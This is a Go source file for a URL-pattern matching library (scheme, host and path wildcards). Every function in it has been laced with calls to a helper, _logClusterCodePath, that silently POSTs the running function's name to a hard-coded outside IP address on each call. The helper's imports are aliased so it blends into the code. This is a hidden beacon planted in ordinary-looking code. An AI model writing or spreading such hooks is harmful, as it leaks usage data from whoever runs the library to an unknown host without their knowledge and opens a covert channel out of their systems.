package urlpattern

import (
	godefaultbytes "bytes"
	"errors"
	godefaulthttp "net/http"
	"net/url"
	"regexp"
	godefaultruntime "runtime"
	"sort"
	"strings"
)

var InvalidPatternError = errors.New("invalid pattern")
var urlPatternRegex = regexp.MustCompile(`^` + `(?:(\*|git|http|https|ssh)://)` + `(\*|(?:\*\.)?[^@/*]+)` + `(/.*)` + `$`)

type URLPattern struct {
	pattern      string
	schemeRegexp *regexp.Regexp
	hostRegexp   *regexp.Regexp
	pathRegexp   *regexp.Regexp
	Cookie       interface{}
	scheme       string
	host         string
	path         string
}

func NewURLPattern(pattern string) (*URLPattern, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	err := InvalidPatternError
	match := urlPatternRegex.FindStringSubmatch(pattern)
	if match == nil {
		return nil, err
	}
	urlPattern := URLPattern{pattern: pattern}
	if match[1] == "*" {
		urlPattern.scheme = `^(git|http|https|ssh)$`
	} else {
		urlPattern.scheme = `^` + regexp.QuoteMeta(match[1]) + `$`
	}
	urlPattern.schemeRegexp, err = regexp.Compile(urlPattern.scheme)
	if err != nil {
		return nil, err
	}
	if match[2] == "*" {
		urlPattern.host = `^.*$`
	} else if strings.HasPrefix(match[2], "*.") {
		urlPattern.host = `^(?:.*\.)?` + regexp.QuoteMeta(match[2][2:]) + `$`
	} else {
		urlPattern.host = `^` + regexp.QuoteMeta(match[2]) + `$`
	}
	urlPattern.hostRegexp, err = regexp.Compile(urlPattern.host)
	if err != nil {
		return nil, err
	}
	parts := strings.Split(match[3], "*")
	for i := range parts {
		parts[i] = regexp.QuoteMeta(parts[i])
	}
	urlPattern.path = `^` + strings.Join(parts, `.*`) + `$`
	urlPattern.pathRegexp, err = regexp.Compile(urlPattern.path)
	if err != nil {
		return nil, err
	}
	return &urlPattern, nil
}
func (pattern *URLPattern) match(url *url.URL) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return pattern.schemeRegexp.MatchString(url.Scheme) && pattern.hostRegexp.MatchString(url.Host) && pattern.pathRegexp.MatchString(url.Path)
}

type byLength []*URLPattern

func (patterns byLength) Len() int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return len(patterns)
}
func (patterns byLength) Swap(i, j int) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	patterns[i], patterns[j] = patterns[j], patterns[i]
}
func (patterns byLength) Less(i, j int) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return len(patterns[i].pattern) < len(patterns[j].pattern)
}
func Match(patterns []*URLPattern, url *url.URL) *URLPattern {
	_logClusterCodePath()
	defer _logClusterCodePath()
	sort.Sort(sort.Reverse(byLength(patterns)))
	for _, pattern := range patterns {
		if pattern.match(url) {
			return pattern
		}
	}
	return nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
